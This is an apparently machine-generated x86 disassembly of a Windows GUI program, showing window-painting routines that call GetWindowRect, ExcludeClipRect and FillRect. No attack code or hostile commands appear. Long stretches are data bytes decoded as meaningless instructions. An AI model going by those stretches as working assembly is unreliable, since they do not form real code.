mov [ ecx + 0x4 ] 0x5
mov eax 0xe
jmp r-xdata
mov [ ecx + 0x4 ] 0x6
mov eax 0x11
jmp r-xdata
mov [ ecx + 0x4 ] 0x7
mov eax 0x14
jmp r-xdata
mov [ ecx + 0x4 ] 0x8
mov eax 0x16
jmp r-xdata
mov [ ecx + 0x4 ] 0x9
mov eax 0x18
jmp r-xdata
mov [ ecx + 0x4 ] 0xa
mov eax 0x1a
jmp r-xdata
mov [ ecx + 0x4 ] 0xb
mov eax 0x1c
jmp r-xdata
mov [ ecx + 0x4 ] 0xc
mov eax 0x1e
jmp r-xdata
mov [ ecx + 0x4 ] 0xd
mov eax 0x20
jmp r-xdata
mov [ ecx + 0x4 ] 0xe
mov eax 0x24
jmp r-xdata
mov [ ecx + 0x4 ] 0xf
mov eax 0x28
jmp r-xdata
mov [ ecx + 0x4 ] 0x10
mov eax 0x2c
jmp r-xdata
mov [ ecx + 0x4 ] 0x11
mov eax 0x30
jmp r-xdata
mov [ ecx + 0x4 ] 0x12
mov eax 0x34
jmp r-xdata
mov [ ecx + 0x4 ] 0x13
mov eax 0x38
jmp r-xdata
mov [ ecx + 0x4 ] 0x14
mov eax 0x3c
jmp r-xdata
mov [ ecx + 0x4 ] 0x15
mov eax 0x40
jmp r-xdata
mov [ ecx + 0x4 ] 0x16
mov eax 0x44
jmp r-xdata
mov [ ecx + 0x4 ] 0x17
mov eax 0x48
jmp r-xdata
mov [ ecx + 0x4 ] 0x18
mov eax 0x4c
jmp r-xdata
mov [ ecx + 0x4 ] 0x19
mov eax 0x50
jmp r-xdata
mov [ ecx + 0x4 ] 0x1a
mov eax 0x54
jmp r-xdata
mov [ ecx + 0x4 ] 0x1b
mov eax 0x58
jmp r-xdata
mov [ ecx + 0x4 ] 0x1c
mov eax 0x5c
jmp r-xdata
mov [ ecx + 0x4 ] 0x1d
mov eax 0x60
jmp r-xdata
mov [ ecx + 0x4 ] 0x1e
mov eax 0x61
jmp r-xdata
mov [ ecx + 0x4 ] 0x1f
mov eax 0x62
jmp r-xdata
mov [ ecx + 0x4 ] 0x20
mov eax 0x63
jmp r-xdata
mov [ ecx + 0x4 ] 0x21
mov eax 0x64
jmp r-xdata
mov [ ecx + 0x4 ] 0x22
mov eax 0x65
jmp r-xdata
mov [ ecx + 0x4 ] 0x23
mov eax 0x66
jmp r-xdata
mov [ ecx + 0x4 ] 0x24
mov eax 0x67
jmp r-xdata
mov [ ecx + 0x4 ] 0x25
mov eax 0x68
jmp r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
sub_4296fc
push ebp
mov ebp esp
add esp 0xffffffbc
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov esi eax
push 0xffffffec
mov eax [ ebp - 0x4 ]
call sub_43f228
push eax
call GetWindowLongA
test ah 0x2
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_43f228
push eax
call GetWindowRect
mov eax [ ebp - 0x24 ]
neg eax
push eax
mov eax [ ebp - 0x28 ]
neg eax
push eax
lea eax [ ebp - 0x28 ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
call sub_43f228
push eax
call GetWindowDC
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_429857
push [ fs : edx ]
mov [ fs : edx ] esp
push esi
lea esi [ ebp - 0x28 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
test bl bl
je r-xdata
mov eax [ ebp - 0x1c ]
sub eax 0x2
push eax
mov eax [ ebp - 0x20 ]
sub eax 0x2
push eax
mov eax [ ebp - 0x24 ]
add eax 0x2
push eax
mov eax [ ebp - 0x28 ]
add eax 0x2
push eax
mov eax [ ebp - 0x8 ]
push eax
call ExcludeClipRect
lea ecx [ ebp - 0x34 ]
mov dl 0x2
mov eax esi
call sub_429334
lea eax [ ebp - 0x28 ]
push eax
push 0x0
lea ecx [ ebp - 0x34 ]
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_4291a0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_43f228
push eax
call ReleaseDC
retn
push 0xfffffff0
mov eax [ ebp - 0x4 ]
call sub_43f228
push eax
call GetWindowLongA
test eax 0x100000
je r-xdata
test eax 0x200000
je r-xdata
push 0x2
call GetSystemMetrics
mov edi eax
push 0x3
call GetSystemMetrics
mov ebx eax
push 0xfffffffe
push 0xfffffffe
lea eax [ ebp - 0x18 ]
push eax
call InflateRect
mov eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x44 ]
push eax
mov edx [ ebp - 0xc ]
sub edx ebx
mov eax [ ebp - 0x10 ]
sub eax edi
mov ecx [ ebp - 0x10 ]
call sub_412378
push esi
lea esi [ ebp - 0x44 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
push 0xf
call GetSysColorBrush
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call FillRect
sub_429884
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4298bf
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4298c6
retn
mov eax [ rw-data ]
call sub_403258
mov eax rw-data
call sub_403f90
sub_429afa
inc edx
add ah al
cdq
inc ebx
add al al
cdq
inc ebx
add [ eax - 0x7bffbc66 ] dl
jge r-xdata
inc ebx
add ah bh
add al cl
test [ ebx ] al
sub al 0x84
inc ebx
add [ ebp + ecx * 4 + 0x43 ] dl
add ah cl
jl r-xdata
bound esp [ ebp + 0x6c ]
lea eax [ eax ]
mov al [ 0x700429b ]
or al 0x54
inc ebx
jne r-xdata
add [ eax - 0x71 ] ch
inc ebx
add ah ch
rol [ edx ] 0x1
push 0x70042d0
add [ edx ] dl
mov al 0xe
mov al 0x6
mov al 0x13
mov al 0x14
mov al 0xc7
inc esi
inc [ eax ]
aad 0x42
inc edx
add [ edi ] al
add al dl
jl r-xdata
cmp eax 0xd2e80041
inc edx
add al dl
aam 0x42
je r-xdata
add [ esi + edi * 2 + 0x43 ] bh
add [ eax ] ch
mov [ ebx ] al
call 0xffffffffbc42ddc9
xchg ebp eax
inc ecx
add [ ebp + edx * 4 - 0x670fffbf ] dh
inc ecx
add al dl
iretd
[ eax ] eax
je r-xdata
adc dh [ eax - 0x4ff94ff2 ]
adc esi [ eax - 0x384fec ]
add ah cl
lodsb [ esi ]
inc ebx
add al bh
lodsb [ esi ]
inc ebx
add al dh
rol [ edx ] cl
dec eax
jle r-xdata
add [ eax + 0x3d ] dl
inc ecx
add al ch
rol [ edx ] cl
rcl ah 0x1
inc edx
insd
dec esp
popad
bound esp [ ebp + 0x6c ]
int3
or al 0x32
inc eax
add ah cl
add al 0x44
add [ ebx + ebp * 4 ] dh
inc ebx
add [ edi + ebx * 4 ] ch
inc ebx
inc ebx
add al dh
xor [ eax ] eax
insd
dec esp
popad
add [ edx * 8 - 0x2acbffbe ] bl
inc edx
add al dl
aad 0x42
add ah dh
aad 0x42
add [ ebx + edx * 8 ] al
inc edx
add [ eax + edx * 8 + 0x42 ] bh
add [ esp + edx * 2 ] cl
inc ebx
jne r-xdata
inc edx
jg r-xdata
add [ ecx + ecx * 4 - 0x76ebffbd ] bl
inc ebx
add [ eax ] ch
mov [ ebx ] es
aam 0x8a
inc ebx
add al al
pushfd
inc ebx
add [ ebp + ebp * 4 + 0x43 ] bh
add [ edi + ecx * 4 ] dl
inc ebx
add [ eax - 0x3ffbc71 ] cl
sub_42a036
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and eax [ eax ]
or [ edi + 0x6f ] dl
jb r-xdata
add [ eax ] al
and [ esi ] 0x0
or cl [ edi + 0x6e ]
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
imul esp [ ebx + 0x6b ] r-xdata
call 0xffffffffe941a0c5
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0027 ] al
outsb
inc esp
jb r-xdata
push edi
jb r-xdata
add [ eax ] 0x0
add [ eax + 0x4f09002a ] al
outsb
inc esp
jb r-xdata
jo r-xdata
add [ eax ] al
add [ eax + 0x4f09002d ] al
outsb
movsb [ di ] [ si ]
cmp al 0x43
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
jo r-xdata
add bh bh
pushad
mov [ ebx ] eax
mov esp 0x43aa
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and al [ eax ]
pop es
push esi
imul esi [ ebx + 0x69 ] 0x656c62
adc [ eax ] al
outsd
add [ eax ] eax
[ eax + 0x10042d4 ]
push cs
inc ecx
add [ eax ] ah
add [ eax ] eax
jmp [ eax ]
inc esp
outsd
arpl [ ebx - 0x10 ] bp
inc ebx
add [ eax ] dl
add [ eax ] eax
call [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0031 ] al
outsb
push ebp
jo r-xdata
je r-xdata
inc esp
outsd
ja r-xdata
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0028 ] al
outsb
inc esp
jb r-xdata
inc ebx
add al dh
add [ eax ] al
push eax
add [ esp ] bl
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bl
mov [ 0xffffffffa40a0042 ] eax
jb r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b002c ] al
outsb
dec ebp
outsd
jne r-xdata
push cs
inc ecx
add [ eax - 0x7f00ffff ] al
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c002e ] al
outsb
dec ebp
outsd
jne r-xdata
push ebx
je r-xdata
xor [ ecx ] 0x0
or ecx [ edi + 0x6e ]
jb r-xdata
sbb al 0x3d
inc ebx
add al bl
add [ eax ] al
add [ eax + 0x4f0b002b ] al
add [ eax ] al
dec edi
jbe r-xdata
inc ebx
add al bh
lodsb [ esi ]
inc ebx
add al ah
salc
inc edx
add [ eax + 0x7e ] cl
inc ebx
add [ ecx + ecx * 4 - 0x76ebffbd ] bl
inc ebx
add [ eax ] ch
mov [ ebx ] es
aam 0x8a
inc ebx
add [ esp + ecx * 8 ] bh
inc ebx
add [ ebp + ebp * 4 + 0x43 ] bh
add [ eax + esi * 8 + 0x43 ] bl
add [ eax ] bl
int1
inc ebx
add [ esp + ebp * 8 ] dl
inc ebx
add ah bh
add [ edx + esi * 4 ] bl
inc ebx
add [ eax ] ch
mov [ ebx ] al
call 0xffffffffbc42e4a9
xchg ebp eax
inc ebx
add al dl
cwde
inc ecx
add [ esp + esi - 0x6defffc0 ] dl
and [ edx ] al
add [ eax ] al
or al 0x4b
inc esp
jb r-xdata
popad
jbe r-xdata
dec ebp
outsd
jbe r-xdata
inc ebp
outsb
dec ebp
outsd
jne r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub eax 0x6e4f0900
push cs
inc ecx
add [ eax + 0x1 ] bh
add bh bh
js r-xdata
outsb
dec ebp
outsd
jne r-xdata
jb r-xdata
inc edx
add [ eax ] ah
add al [ eax ]
add [ ebx + ecx * 2 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
fsub [ ebx - 0x5bf5ffbe ]
pop esp
mov [ 0xd030042 ] al
push esp
inc ebp
imul esi [ fs : ebx + eax * 2 + 0x68 ] 0x61437261
jae r-xdata
add [ eax ] al
add [ eax - 0x5e ] bl
inc edx
add [ eax ] cl
clc
inc eax
inc ebx
add [ eax ] al
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0030 ] al
outsb
push ebx
je r-xdata
or al 0x4f
movsb [ edi ] [ esi ]
cmp al 0x43
add al ah
add [ eax ] al
jmp eax
outsb
dec ebp
outsd
jne r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c002f ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
das
add [ edi + ecx * 2 ] cl
inc ebp
outsb
inc esp
jb r-xdata
add [ eax ] al
sub [ edx ] 0x0
or [ edi + 0x6e ] ecx
aas
inc ebx
add [ eax ] cl
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090029 ] al
outsb
inc ebp
outsb
inc esp
outsd
arpl [ ebx + 0x38 ] bp
aas
inc ebx
add [ eax ] bl
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ecx
add [ esp + esi - 0x220bffc0 ] bl
inc edx
add al dh
xor [ eax ] eax
or al 0x32
inc eax
add [ eax - 0x50 ] bh
rcr [ eax + 0x34940041 ] 0x1
inc eax
add [ eax ] dl
add [ eax ] eax
add [ eax ] al
add [ edx ] al
js r-xdata
popad
insb
or esp [ ebp + 0x63 ]
push ebp
jo r-xdata
or esp [ ebp + 0x63 ]
dec esp
outsd
ja r-xdata
jb r-xdata
arpl [ gs : esi + 0x6f ] cx
jb r-xdata
dec esp
je r-xdata
inc ebx
add [ eax - 0x3 ] al
add [ eax + 0x3d ] dl
inc ecx
add ah bh
stosb [ edi ]
jb r-xdata
inc ebx
add [ eax ] dl
jg r-xdata
cmp eax 0xaafc0041
jb r-xdata
mov eax eax
inc ecx
add [ ebp + edx * 4 - 0x670fffbf ] dh
inc ecx
add [ eax ] bl
salc
inc edx
add [ eax + edi * 8 + 0x43 ] dl
add [ eax - 0x3 ] dh
inc ebx
add [ esp + edi * 8 + 0x7d840043 ] bh
inc ebx
add al dl
inc ebx
add al dh
inc ebx
add [ eax ] cl
insb
jae r-xdata
dec ebx
popad
jae r-xdata
xchg edx eax
popad
jae r-xdata
shl al 0xa2
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebx
add [ eax - 0x3b ] ch
inc ebx
or [ ebx + 0x74 ] dl
inc ebx
sub_42b444
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ ebp + 0x2c0042 ] dh
add [ eax ] al
cmp [ eax + 0x43 ] cl
add [ eax - 0x6bffbfcc ] cl
xor al 0x40
add [ eax - 0x63ffbfcc ] bl
xor al 0x40
add [ eax - 0xfffbfcc ] dl
xor [ eax ] eax
or al 0x32
inc eax
add [ ecx + ebx * 4 - 0x137ffbf ] bh
inc edx
add al dh
cdq
inc ecx
add [ ecx + edi * 2 - 0x65dbffbd ] ah
inc ecx
add [ eax + 0x7a ] dl
inc ebx
add [ ecx + ebx * 4 + 0x41 ] dh
add [ eax ] cl
0x9a5c0041 0x41
nop
js r-xdata
inc ebx
add ah ch
inc [ edx ]
add al 0x79
inc ebx
add [ eax ] bh
push eax
inc esp
add [ edi + ebp * 4 + 0x43 ] al
add [ edx + edi * 2 + 0x43 ] bh
add [ eax ] bh
jns r-xdata
inc ebx
add al dl
cwde
inc ecx
add [ esp + esi - 0x6defffc0 ] dl
inc ecx
add [ esp + esi - 0x325fffc0 ] bl
inc ebx
add al dh
xor [ eax ] eax
or al 0x32
inc eax
add [ eax - 0x50 ] bh
inc ebx
add [ eax - 0x3 ] al
inc ebx
add [ eax - 0x3b ] ch
inc ebx
add [ eax + 0x3d ] dl
inc ecx
add ah bh
stosb [ edi ]
inc ebx
add [ eax ] dl
jg r-xdata
add [ eax + 0x11004377 ] ah
push esp
inc edx
jne r-xdata
add [ eax - 0x63ffbbb0 ] cl
push eax
inc esp
add [ eax + 0x79 ] dh
inc ebx
add ah al
push eax
inc esp
add ah cl
jns r-xdata
inc ebx
add al bh
lodsb [ esi ]
inc ebx
add [ eax ] dl
mov [ ebx ] al
dec eax
jle r-xdata
add [ edx + esi * 4 ] bl
mov [ ebx ] al
call 0xffffffffbc42f721
xchg ebp eax
inc ecx
add [ ebp + edx * 4 - 0x670fffbf ] dh
inc ecx
add [ eax + 0x540042ff ] cl
clc
inc ebx
add [ eax - 0x3 ] dh
inc ebx
add [ esp + edi * 8 + 0x7d840043 ] bh
inc ebx
add al dl
inc ebx
add al dh
inc ebx
add [ eax ] cl
je r-xdata
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x4a ] ch
inc edx
add [ eax ] al
add [ edi + edi * 8 ] ah
inc edx
add ah ch
jns r-xdata
inc ebx
add [ edi + eax * 8 + 0x43 ] ah
add [ esi + eax * 8 ] bl
inc ebx
add ah al
lds eax [ ebx ]
cmp al 0xf2
inc ebx
add [ eax + edx * 8 ] cl
inc ebx
add [ eax ] dh
add al 0x44
add [ eax - 0x57ffbc12 ] bh
int1
inc ebx
add [ eax + eax ] ch
inc ebx
add [ eax ] dl
inc ebx
add [ eax + eax ] al
cmp [ ebp - 0x10ffec ] bh
fcos
int3
add [ ecx + ecx * 4 - 0x76ebffbd ] bl
inc ebx
add [ eax ] ch
mov [ ebx ] es
aam 0x8a
inc ebx
add [ eax + eax + 0x43 ] dl
add [ ebp + ebp * 4 + 0x43 ] bh
add [ eax + esi * 8 + 0x43 ] bl
add [ eax ] bl
int1
inc ebx
add [ esp + ebp * 8 ] dl
inc ebx
add ah bh
inc ebx
add [ eax ] ch
outsb
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0xb568c08b
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bh
mov dh 0x42
add [ edx - 0x4a ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
push 0x42b6
add ah dl
push eax
inc esp
add [ edi + ebp * 4 + 0x43 ] cl
add al ah
jpe r-xdata
inc edx
add [ edx + eax ] cl
add [ eax ] al
or al 0x4b
add [ eax ] al
add [ eax ] al
add [ eax ] ah
jpo r-xdata
add [ eax ] al
cmp [ esi - 0x49adffbe ] dh
add [ edx + edi * 2 ] cl
inc ebx
add al ch
push eax
inc esp
add ah ch
push eax
inc esp
add [ eax ] dh
jpe r-xdata
sub_42b5f2
inc ebx
add [ edx + esi * 4 - 0x46d7ffbd ] dl
inc ebx
add al cl
mov [ ebx ] 0x44
add [ ebx ] eax
mov al 0xc3
inc ebx
add al ah
rol [ ebx ] 0x60
mov [ ebx ] sub_43c764
sbb al 0xc6
inc ebx
add ah al
lds eax [ ebx ]
cmp al 0xf2
inc ebx
add [ eax + edx * 8 ] cl
inc ebx
add [ eax ] dh
add al 0x44
add [ eax - 0x57ffbc12 ] bh
int1
inc ebx
add [ eax + eax ] ch
inc ebx
add [ eax ] dl
inc ebx
add [ eax + eax ] al
cmp [ ebp - 0x10ffec ] bh
fcos
int3
sub_42b766
inc ebx
add [ edx + esi * 4 - 0x46d7ffbd ] dl
inc ebx
add al cl
mov [ ebx ] 0x90
add al [ ebx ]
mov al 0xc3
inc ebx
add ah cl
add al [ ebx ]
pushad
mov [ ebx ] sub_43c764
sbb al 0xc6
inc ebx
add ah al
lds eax [ ebx ]
cmp al 0xf2
inc ebx
add [ eax + edx * 8 ] cl
inc ebx
add [ eax ] dh
add al 0x44
add [ eax - 0x57ffbc12 ] bh
int1
inc ebx
add [ eax + eax ] ch
inc ebx
add [ eax ] dl
inc ebx
add [ eax ] cl
add al [ ebx ]
or [ eax ] al
add eax 0x7b006b0
mov al 0x11
mov ebp 0x14bd35
jmp r-xdata
dec eax
sub_42b9dc
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb [ eax ] al
push cs
push eax
popad
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5009001b ] al
outsd
jo r-xdata
outsb
je r-xdata
pushad
mov [ ebx ] eax
mov esp 0x43aa
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
pop ds
add [ edi ] al
push esi
imul esi [ ebx + 0x69 ] 0x656c62
adc [ eax ] al
or [ edx ] eax
add bh bh
push 0x1004301
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and [ eax ] al
or [ edi + 0x6f ] dl
jb r-xdata
jo r-xdata
add [ eax ] al
sbb al [ eax ]
push cs
push eax
popad
jb r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x65646f
adc [ eax ] al
pop ecx
add [ eax ] al
[ ebx + ecx * 4 + 0x43 ]
add [ eax ] al
and [ ebx ] 0x0
or cl [ edi + 0x6e ]
inc esp
jb r-xdata
push edi
jb r-xdata
movsb [ edi ] [ esi ]
add [ eax ] eax
[ esp + esi * 8 + 0x43 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
push ds
add [ edi ] al
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
outsb
jne r-xdata
outsb
je r-xdata
add [ eax ] 0x0
add [ eax + 0x4f090026 ] al
outsb
inc esp
jb r-xdata
jo r-xdata
adc [ eax ] al
push edi
add [ eax ] al
jmp [ eax - 0x77 ]
adc [ eax ] al
cdq
add [ eax ] al
call [ eax + 0x5800438b ]
mov eax [ ebx ]
add [ eax ] al
add [ eax - 0x80000000 ] al
sbb al 0x0
or [ ebx + 0x68 ] dl
inc ebx
add [ esp + esi * 8 + 0x43 ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
push 0x6948776f
outsb
je r-xdata
dec ebx
jns r-xdata
ror [ 0x41 ] 0xc0
add [ eax ] eax
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
push cs
inc ecx
add al al
jo r-xdata
add bh bh
push cs
inc ecx
add [ eax ] ah
add [ eax ] eax
jmp [ eax ]
add [ eax ] dl
inc eax
add [ edi ] dl
imul ebp [ esi + 0x74 ] r-xdata
outsd
ja r-xdata
jpo r-xdata
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
jns r-xdata
jb r-xdata
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0024 ] al
outsb
inc esp
jb r-xdata
inc ebx
add al dh
add [ eax ] al
push eax
sar [ edx ] 0x1
inc ebx
add ah al
add [ eax + eax ] bh
loopne r-xdata
jo r-xdata
cmp eax 0xd80043
int3
add bh bh
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub eax 0x6e4f0b00
fadd [ eax ]
jb r-xdata
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
push cs
inc ecx
add al cl
add [ eax ] eax
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060028 ] al
outsb
inc ebp
js r-xdata
add [ eax + 0x4f070027 ] al
add [ eax ] al
dec edi
jbe r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ cs : ecx ] cl
dec edi
outsb
add [ eax ] al
add [ eax - 0x80000000 ] al
sub [ eax ] eax
or [ edi + 0x6e ] ecx
cmp al 0x43
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b002c ] al
outsb
dec ebp
outsd
jne r-xdata
popad
dec ebp
outsd
jbe r-xdata
dec ebp
outsd
jne r-xdata
dec edi
outsb
jae r-xdata
jns r-xdata
je r-xdata
outsb
inc ebp
outsb
je r-xdata
jb r-xdata
inc ecx
add [ esp + esi - 0x6defffc0 ] dl
adc al 0x2
add [ eax ] al
sbb al 0xb5
inc edx
add al dl
cwde
push ebp
jo r-xdata
arpl [ ebx - 0x10 ] bp
inc ebx
add [ eax ] dl
add [ eax ] eax
call [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0030 ] al
inc esp
outsd
ja r-xdata
inc ebx
add al bh
lodsb [ esi ]
inc ebx
add [ eax ] dl
mov [ ebx ] al
dec eax
jle r-xdata
add [ edx + esi * 4 ] bl
outsb
push ebx
je r-xdata
dec edi
movsb [ edi ] [ esi ]
cmp al 0x43
add al ah
add [ eax ] al
jmp eax
cmp [ 0x1e80043 ] 0x0
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and eax 0x6e4f0900
cmp eax 0x1d80043
add bh bh
fadd [ ecx ]
add bh bh
add [ eax ] eax
add [ eax ] al
inc ebp
outsb
inc esp
jb r-xdata
add [ eax ] al
and [ esi ] 0x0
or [ edi + 0x6e ] ecx
inc ebp
outsb
inc esp
outsd
arpl [ ebx + 0x38 ] bp
aas
inc ebx
add [ eax ] bl
add [ eax ] eax
aas
inc ebx
add [ eax ] cl
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090025 ] al
outsb
dec ebp
outsd
jne r-xdata
inc eax
inc ebx
add [ eax ] al
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b002f ] al
outsb
push ebx
je r-xdata
add [ eax ] dl
jg r-xdata
jb r-xdata
sbb al 0x3d
inc ebx
add al bl
add [ eax ] al
inc ebx
add [ edi + eax * 8 + 0x43 ] ah
add [ esi + eax * 8 ] bl
inc ebx
add ah al
lds eax [ ebx ]
cmp al 0xf2
inc ebx
add [ eax + edx * 8 ] cl
inc ebx
add [ eax ] dh
add al 0x44
add [ eax - 0x57ffbc12 ] bh
int1
inc ebx
add [ eax ] bl
add eax 0x61c0043
inc ebx
add [ eax + eax ] al
adc [ eax - 0x42ee4ffa ] dh
0x2cff
add [ ecx + ecx * 4 - 0x76ebffbd ] bl
inc ebx
add [ eax ] ch
mov [ ebx ] es
aam 0x8a
inc ebx
add [ eax + eax + 0x43 ] dl
add [ ebp + ebp * 4 + 0x43 ] bh
add [ eax + esi * 8 + 0x43 ] bl
add [ eax ] bl
int1
inc ebx
add [ esp + ebp * 8 ] dl
inc ebx
add ah bh
inc ecx
add [ esp + esi - 0x325fffc0 ] bl
inc ebx
add al dh
xor [ eax ] eax
or al 0x32
inc eax
add [ eax - 0x50 ] bh
xchg edx eax
jb r-xdata
inc ecx
add [ eax + 0x54004304 ] bh
clc
inc ebx
add [ eax - 0x3 ] dh
inc ebx
add [ esp + edi * 8 + 0x7d840043 ] bh
inc ebx
add al dl
inc ebx
add al dh
inc ebx
add [ eax ] cl
mov ah 0x95
inc ecx
add al dh
cwde
inc esp
jb r-xdata
inc ebx
add [ eax - 0x3 ] al
inc ebx
add [ eax - 0x3b ] ch
inc ebx
add [ eax + 0x3d ] dl
inc ecx
add ah bh
stosb [ edi ]
inc ebx
inc esp
outsd
inc ebx
add [ eax ] ch
mov [ ebx ] al
call 0xffffffffbc42ff65
xchg ebp eax
inc ecx
add [ ebp + edx * 4 - 0x670fffbf ] dh
sbb al 0xb2
lodsb [ si ]
mov ebp 0x42
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
test al 0xbe
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + edi * 4 + 0x42 ] bh
add [ esi + 0x140042be ] dl
add al [ eax ]
add [ esi * 4 - 0x672fffbe ] bl
sub_42ca88
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_440eac
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov edx 0xb9
mov eax esi
call sub_4381fc
mov edx 0x69
mov eax esi
call sub_438220
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403564
mov eax esi
pop esi
pop ebx
retn
call sub_4035bc
pop [ fs : 0x0 ]
add esp 0xc
sub_42cae4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43b294
mov edx [ ebx + 0x68 ]
mov eax [ ebx + 0x208 ]
call sub_41d358
mov edx r-xdata
